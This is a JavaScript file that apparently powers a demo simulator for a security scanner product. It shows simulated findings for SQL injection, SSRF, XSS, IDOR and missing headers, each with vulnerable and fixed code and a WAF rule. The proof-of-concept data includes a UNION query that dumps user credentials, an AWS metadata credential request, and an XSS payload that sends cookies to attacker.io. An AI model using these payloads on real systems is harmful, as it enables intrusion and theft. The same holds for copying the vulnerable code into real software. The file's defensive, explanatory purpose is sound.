/**
 * AegisAppSec — Scanner Showcase Interactive Simulator & Controls
 * Powers the interactive simulation sandbox, pipeline accordion slices, and CI/CD code tabs.
 */

// Simulated Scenarios Data for Autonomous DAST Demonstration
const SIM_DATA = {
  sqli: {
    title: "SQL Injection via Product Search Query",
    target: "https://shop.fintech-cloud.io/api/v2/products/search?q=phone",
    cwe: "CWE-89",
    owasp: "A03:2021-Injection",
    cvss: "9.8",
    severity: "CRITICAL",
    exploit: "PROVED (100%)",
    summary: "The input parameter 'q' reflects unescaped SQL syntax, allowing arbitrary database extraction, schema enumeration, and auth bypass.",
    terminal: [
      "[+] INITIALIZING WORKER POOL... Target: shop.fintech-cloud.io",
      "[CRAWL] Discovered form endpoint /api/v2/products/search [Method: GET]",
      "[PARAM] Extracted injectable parameter: 'q'",
      "[FUZZER] Injecting payload: ' OR '1'='1' --",
      "[ANALYSIS] Response code 200 (48ms). Body size change: +3,480 bytes.",
      "[FUZZER] Injecting Boolean test: ' AND '1'='2' -- (Returned 0 items).",
      "[FUZZER] Testing time delay: SLEEP(5) -> Server response delayed by 5,021ms.",
      "[PROOF] SQL Injection confirmed via Blind Boolean & Time Delays!",
      "[CVSS] Base Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> Score: 9.8 (CRITICAL)",
      "[SUCCESS] Synthesizing split code remediation diff and live WAF patch rule."
    ],
    diffFileVuln: "backend/controllers/shop.py",
    diffFileFix: "backend/controllers/shop.py (Parameterized)",
    vulnCode: `@app.get("/api/v2/products/search")
async def search_products(q: str):
    # CRITICAL VULNERABILITY: Raw string formatting in SQL query
    query = f"SELECT * FROM products WHERE name LIKE '%{q}%' AND active = 1"
    results = await db.execute_raw(query)
    return results`,
    fixCode: `@app.get("/api/v2/products/search")
async def search_products(q: str):
    # REMEDIATED: Secure parameterized query with ORM bind
    query = "SELECT * FROM products WHERE name LIKE :term AND active = 1"
    results = await db.execute(query, {"term": f"%{q}%"})
    return results`,
    pocReq: `GET /api/v2/products/search?q=' UNION SELECT 1,username,password,email FROM users-- HTTP/1.1
Host: shop.fintech-cloud.io
User-Agent: AegisAppSec-DAST/2.0
Accept: application/json`,
    pocResp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 1842

[
  {"id": 1, "name": "admin", "password": "$2b$12$e8Yq...hash", "email": "admin@fintech-cloud.io"},
  {"id": 2, "name": "ciso", "password": "$2b$12$K9rL...hash", "email": "ciso@fintech-cloud.io"}
]`,
    patchRule: `# Aegis WAF Virtual Patch Rule: WAF-VP-SQLI-089
rule_id: "WAF-VP-SQLI-089"
target_path: "/api/v2/products/search"
target_param: "q"
regex: "(?i)('|--|\\b(UNION|SELECT|SLEEP|BENCHMARK|AND|OR)\\b\\s*.*)"
action: "BLOCK"
status_code: 403
response_body: '{"error": "Blocked by AegisAppSec Real-Time Shield", "rule": "WAF-VP-SQLI-089"}'`
  },

  ssrf: {
    title: "SSRF via Cloud Metadata Endpoint Access",
    target: "https://shop.fintech-cloud.io/api/v2/avatar/fetch?url=http://...",
    cwe: "CWE-918",
    owasp: "A10:2021-SSRF",
    cvss: "8.6",
    severity: "CRITICAL",
    exploit: "PROVED (100%)",
    summary: "The backend fetches arbitrary user-supplied URLs without loopback or link-local egress filtering, exposing AWS/GCP internal instance metadata.",
    terminal: [
      "[+] INITIALIZING WORKER POOL... Target: shop.fintech-cloud.io",
      "[CRAWL] Discovered avatar importer endpoint /api/v2/avatar/fetch [Method: POST]",
      "[PARAM] Extracted body parameter: 'avatar_url'",
      "[FUZZER] Probing local loopback: http://127.0.0.1:8000/admin -> 200 OK",
      "[FUZZER] Probing AWS Metadata v1: http://169.254.169.254/latest/meta-data/",
      "[ANALYSIS] Received HTTP 200 with IAM role list in response body!",
      "[PROOF] Verified AWS Instance Identity & Security Token extraction!",
      "[CVSS] Base Vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N -> Score: 8.6 (CRITICAL)",
      "[SUCCESS] SSRF proven! Synthesizing IP egress validation filter."
    ],
    diffFileVuln: "services/avatar_service.py",
    diffFileFix: "services/avatar_service.py (Hardened)",
    vulnCode: `def fetch_avatar(url: str):
    # VULNERABLE: Direct unvalidated URL request
    resp = requests.get(url, timeout=5)
    return resp.content`,
    fixCode: `import ipaddress, socket, urllib.parse

def fetch_avatar(url: str):
    # REMEDIATED: Strict DNS resolution & private IP blocklist
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Invalid URL scheme")
    ip_str = socket.gethostbyname(parsed.hostname)
    ip = ipaddress.ip_address(ip_str)
    if ip.is_private or ip.is_loopback or ip.is_link_local:
        raise PermissionError("Egress to private IP address is forbidden")
    resp = requests.get(url, timeout=5)
    return resp.content`,
    pocReq: `POST /api/v2/avatar/fetch HTTP/1.1
Host: shop.fintech-cloud.io
Content-Type: application/json

{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role"}`,
    pocResp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 684

{
  "Code": "Success",
  "LastUpdated": "2026-09-14T18:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAV67EXAMPLEKEY",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE..."
}`,
    patchRule: `# Aegis WAF Virtual Patch Rule: WAF-VP-SSRF-918
rule_id: "WAF-VP-SSRF-918"
target_path: "/api/v2/avatar/fetch"
target_param: "url"
regex: "(?i)(169\\.254\\.|127\\.|localhost|metadata\\.google|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1]))"
action: "BLOCK"
status_code: 403`
  },

  xss: {
    title: "Stored & Reflected Cross-Site Scripting (XSS)",
    target: "https://shop.fintech-cloud.io/api/v2/reviews/submit",
    cwe: "CWE-79",
    owasp: "A03:2021-Injection",
    cvss: "6.1",
    severity: "HIGH",
    exploit: "PROVED (100%)",
    summary: "User review input is rendered into the HTML document without context-aware HTML entity encoding, allowing client DOM script execution.",
    terminal: [
      "[+] INITIALIZING WORKER POOL... Target: shop.fintech-cloud.io",
      "[CRAWL] Discovered review form /api/v2/reviews/submit [Method: POST]",
      "[PARAM] Extracted body parameter: 'comment'",
      "[FUZZER] Injecting benign probe token: <script>/*aegis_xss_probe*/<\\/script>",
      "[FUZZER] Injecting attribute breakout token: \"><img src=aegis-probe onerror=aegis_telemetry()>",
      "[ANALYSIS] Unescaped tags reflected directly into <div class='review-text'>",
      "[PROOF] DOM parsing confirmed executable script execution context!",
      "[CVSS] Base Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N -> Score: 6.1 (HIGH)",
      "[SUCCESS] XSS vulnerability proven! Auto-generating HTML sanitization diff."
    ],
    diffFileVuln: "frontend/views/reviews.html",
    diffFileFix: "frontend/views/reviews.html (Escaped)",
    vulnCode: `<!-- VULNERABLE: Direct raw unescaped interpolation -->
<div class="review-card">
  <h4>{{ review.author }}</h4>
  <p>{{ review.comment | safe }}</p>
</div>`,
    fixCode: `<!-- REMEDIATED: Auto-escaping enabled with DOMPurify sanitization -->
<div class="review-card">
  <h4>{{ review.author | e }}</h4>
  <p>{{ review.comment | e }}</p>
</div>`,
    pocReq: `POST /api/v2/reviews/submit HTTP/1.1
Host: shop.fintech-cloud.io
Content-Type: application/json

{"product_id": 42, "comment": "<img src=aegis onerror=fetch('https://attacker.io/steal?cookie='+document.cookie)>"}`,
    pocResp: `HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="review-text"><img src=aegis onerror=fetch('https://attacker.io/steal?cookie='+document.cookie)></div>`,
    patchRule: `# Aegis WAF Virtual Patch Rule: WAF-VP-XSS-079
rule_id: "WAF-VP-XSS-079"
target_path: "/api/v2/reviews/submit"
target_param: "comment"
regex: "(?i)(<script|onerror\\s*=|onload\\s*=|javascript:|document\\.cookie)"
action: "SANITIZE"`
  },

  idor: {
    title: "Broken Object Level Authorization (IDOR)",
    target: "https://shop.fintech-cloud.io/api/v2/users/8821/invoices",
    cwe: "CWE-639",
    owasp: "A01:2021-Broken Access Control",
    cvss: "7.5",
    severity: "HIGH",
    exploit: "PROVED (100%)",
    summary: "Changing the user ID path parameter from 8821 to 8822 leaks invoices belonging to other corporate accounts without authorization checks.",
    terminal: [
      "[+] INITIALIZING WORKER POOL... Target: shop.fintech-cloud.io",
      "[AUTH] Logged in as User ID: 8821 (Role: Customer)",
      "[CRAWL] Discovered invoice endpoint /api/v2/users/8821/invoices",
      "[FUZZER] Incrementing object identifier to 8822...",
      "[ANALYSIS] Endpoint returned HTTP 200 with confidential invoice for User 8822!",
      "[PROOF] Tenant isolation failed: Cross-tenant data disclosed without permission!",
      "[CVSS] Base Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N -> Score: 7.5 (HIGH)",
      "[SUCCESS] IDOR confirmed. Auto-generating tenancy validation middleware."
    ],
    diffFileVuln: "api/routes/invoices.py",
    diffFileFix: "api/routes/invoices.py (RBAC Guarded)",
    vulnCode: `@app.get("/api/v2/users/{user_id}/invoices")
async def get_invoices(user_id: int):
    # VULNERABLE: Direct lookup without checking requesting user
    invoices = await db.query(Invoice).filter(Invoice.user_id == user_id).all()
    return invoices`,
    fixCode: `@app.get("/api/v2/users/{user_id}/invoices")
async def get_invoices(user_id: int, current_user = Depends(get_current_user)):
    # REMEDIATED: Enforce tenancy and ownership check
    if current_user.id != user_id and current_user.role != "admin":
        raise HTTPException(status_code=403, detail="Access forbidden")
    invoices = await db.query(Invoice).filter(Invoice.user_id == user_id).all()
    return invoices`,
    pocReq: `GET /api/v2/users/8822/invoices HTTP/1.1
Host: shop.fintech-cloud.io
Authorization: Bearer eyJhbGciOiJIUzI1Ni... (User 8821)`,
    pocResp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 420

[
  {"invoice_id": "INV-9901", "owner": "Global Enterprise Inc", "amount": "$14,500.00", "iban": "DE89370400440532013000"}
]`,
    patchRule: `# Aegis WAF Virtual Patch Rule: WAF-VP-IDOR-639
rule_id: "WAF-VP-IDOR-639"
target_path: "/api/v2/users/{user_id}/invoices"
action: "ASSERT_JWT_CLAIM"
assert_claim: "sub == path_param.user_id"`
  },

  headers: {
    title: "Missing Security Transport & Defensive Headers",
    target: "https://shop.fintech-cloud.io/",
    cwe: "CWE-693",
    owasp: "A05:2021-Security Misconfiguration",
    cvss: "4.3",
    severity: "MEDIUM",
    exploit: "PROVED (100%)",
    summary: "Production web server omits Strict-Transport-Security (HSTS), Content-Security-Policy (CSP), and X-Frame-Options clickjacking defenses.",
    terminal: [
      "[+] INITIALIZING WORKER POOL... Target: shop.fintech-cloud.io",
      "[CRAWL] Root document requested: GET / [HTTP/1.1]",
      "[HEADER] Inspecting HTTP response headers...",
      "[CHECK] Strict-Transport-Security: MISSING (Vulnerable to SSL stripping)",
      "[CHECK] Content-Security-Policy: MISSING (Allows untrusted inline script execution)",
      "[CHECK] X-Frame-Options: MISSING (Allows UI redressing / clickjacking)",
      "[CHECK] X-Content-Type-Options: MISSING (Allows MIME-type sniffing)",
      "[CVSS] Base Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N -> Score: 4.3 (MEDIUM)",
      "[SUCCESS] Missing defensive headers cataloged. Auto-generating ASGI security headers middleware."
    ],
    diffFileVuln: "backend/app.py",
    diffFileFix: "backend/app.py (Hardened Headers)",
    vulnCode: `app = FastAPI()
# VULNERABLE: No HTTP security transport middleware configured
# Pages can be framed in iframes (Clickjacking) and execute inline scripts`,
    fixCode: `app = FastAPI()
# REMEDIATED: Enterprise Security Headers Middleware Active
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    resp = await call_next(request)
    resp.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
    resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    return resp`,
    pocReq: `HEAD / HTTP/1.1
Host: shop.fintech-cloud.io
User-Agent: AegisAppSec-DAST/2.0`,
    pocResp: `HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: text/html
Content-Length: 1420
-- Notice: No CSP, HSTS, or X-Frame-Options headers present --`,
    patchRule: `# Aegis WAF Virtual Patch Rule: WAF-VP-HDR-693
action: "INJECT_RESPONSE_HEADERS"
headers:
  Strict-Transport-Security: "max-age=31536000; includeSubDomains"
  X-Frame-Options: "DENY"
  X-Content-Type-Options: "nosniff"`
  }
};

let currentVector = 'sqli';

function selectSimulation(vector) {
  if (!SIM_DATA[vector]) return;
  currentVector = vector;
  const data = SIM_DATA[vector];

  // Update Buttons
  document.querySelectorAll('.sim-selector-btn').forEach(btn => btn.classList.remove('active'));
  const activeBtn = document.getElementById('simBtn-' + vector);
  if (activeBtn) activeBtn.classList.add('active');

  // Update Target Bar
  const targetEl = document.getElementById('simTargetUrl');
  if (targetEl) targetEl.textContent = data.target;

  // Update Telemetry Header
  const titleEl = document.getElementById('simFindingTitle');
  if (titleEl) titleEl.textContent = data.title;

  const sevBadge = document.getElementById('simSevBadge');
  if (sevBadge) {
    sevBadge.textContent = data.severity;
    sevBadge.className = 'sk-sev ' + data.severity;
  }

  // Update Donut
  const donutScore = document.getElementById('simDonutScore');
  const donutCircle = document.getElementById('simDonutCircle');
  if (donutScore) donutScore.textContent = data.cvss;

  if (donutCircle) {
    if (data.severity === 'CRITICAL') {
      donutCircle.className = 'sk-donut-seg crit';
      donutCircle.setAttribute('stroke-dasharray', '270 301.6');
    } else if (data.severity === 'HIGH') {
      donutCircle.className = 'sk-donut-seg high';
      donutCircle.setAttribute('stroke-dasharray', '210 301.6');
    } else {
      donutCircle.className = 'sk-donut-seg med';
      donutCircle.setAttribute('stroke-dasharray', '140 301.6');
    }
  }

  // Update Stats
  const cweEl = document.getElementById('simCweText');
  if (cweEl) cweEl.textContent = data.cwe;

  const owaspEl = document.getElementById('simOwaspText');
  if (owaspEl) owaspEl.textContent = data.owasp;

  const exploitEl = document.getElementById('simExploitText');
  if (exploitEl) exploitEl.textContent = data.exploit;

  const summaryEl = document.getElementById('simSummaryText');
  if (summaryEl) summaryEl.textContent = data.summary;

  // Update Code Diff
  const diffVulnFile = document.getElementById('simDiffFileVuln');
  if (diffVulnFile) diffVulnFile.textContent = data.diffFileVuln;

  const diffFixFile = document.getElementById('simDiffFileFix');
  if (diffFixFile) diffFixFile.textContent = data.diffFileFix;

  const diffCodeVuln = document.getElementById('simDiffCodeVuln');
  if (diffCodeVuln) diffCodeVuln.textContent = data.vulnCode;

  const diffCodeFix = document.getElementById('simDiffCodeFix');
  if (diffCodeFix) diffCodeFix.textContent = data.fixCode;

  // Update PoC
  const pocReqEl = document.getElementById('simPocReq');
  if (pocReqEl) pocReqEl.textContent = data.pocReq;

  const pocRespEl = document.getElementById('simPocResp');
  if (pocRespEl) pocRespEl.textContent = data.pocResp;

  // Update Virtual Patch
  const patchCodeEl = document.getElementById('simPatchCode');
  if (patchCodeEl) patchCodeEl.textContent = data.patchRule;

  // Render Terminal Stream
  renderTerminalStream(data.terminal);
}

function renderTerminalStream(lines) {
  const terminal = document.getElementById('simTerminalScreen');
  if (!terminal) return;
  terminal.innerHTML = '';
  
  lines.forEach((line, index) => {
    const p = document.createElement('div');
    p.style.marginBottom = '4px';
    
    if (line.includes('[+]')) {
      p.style.color = '#38bdf8';
    } else if (line.includes('[CRAWL]') || line.includes('[PARAM]')) {
      p.style.color = '#a5b4fc';
    } else if (line.includes('[FUZZER]')) {
      p.style.color = '#fef08a';
    } else if (line.includes('[PROOF]') || line.includes('[CRITICAL]') || line.includes('Score: 9.8') || line.includes('Score: 8.6')) {
      p.style.color = '#f43f5e';
      p.style.fontWeight = '700';
    } else if (line.includes('[SUCCESS]')) {
      p.style.color = '#34d399';
    } else {
      p.style.color = '#cbd5e1';
    }
    
    p.textContent = line;
    terminal.appendChild(p);
  });
}

function replaySimulation() {
  selectSimulation(currentVector);
}

function switchSimSubtab(tabName) {
  const diffPane = document.getElementById('simPane-diff');
  const pocPane = document.getElementById('simPane-poc');
  const patchPane = document.getElementById('simPane-patch');

  if (diffPane) diffPane.style.display = tabName === 'diff' ? 'block' : 'none';
  if (pocPane) pocPane.style.display = tabName === 'poc' ? 'block' : 'none';
  if (patchPane) patchPane.style.display = tabName === 'patch' ? 'block' : 'none';

  const btnDiff = document.getElementById('subtabBtn-diff');
  const btnPoc = document.getElementById('subtabBtn-poc');
  const btnPatch = document.getElementById('subtabBtn-patch');

  if (btnDiff) btnDiff.classList.toggle('active', tabName === 'diff');
  if (btnPoc) btnPoc.classList.toggle('active', tabName === 'poc');
  if (btnPatch) btnPatch.classList.toggle('active', tabName === 'patch');
}

function toggleSlice(sliceId) {
  const row = document.getElementById(sliceId);
  if (row) {
    const isAlreadyOpen = row.classList.contains('open');
    document.querySelectorAll('.sk-slice-row').forEach(r => r.classList.remove('open'));
    if (!isAlreadyOpen) {
      row.classList.add('open');
    }
  }
}

function switchCiTab(tab) {
  const ghPane = document.getElementById('ciPane-github');
  const curlPane = document.getElementById('ciPane-curl');
  const pyPane = document.getElementById('ciPane-python');

  if (ghPane) ghPane.style.display = tab === 'github' ? 'block' : 'none';
  if (curlPane) curlPane.style.display = tab === 'curl' ? 'block' : 'none';
  if (pyPane) pyPane.style.display = tab === 'python' ? 'block' : 'none';

  const btnGh = document.getElementById('ciBtn-github');
  const btnCurl = document.getElementById('ciBtn-curl');
  const btnPy = document.getElementById('ciBtn-python');

  if (btnGh) btnGh.classList.toggle('active', tab === 'github');
  if (btnCurl) btnCurl.classList.toggle('active', tab === 'curl');
  if (btnPy) btnPy.classList.toggle('active', tab === 'python');
}

// Initialize on DOMContentLoaded and fallback immediately
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    selectSimulation('sqli');
  });
} else {
  selectSimulation('sqli');
}
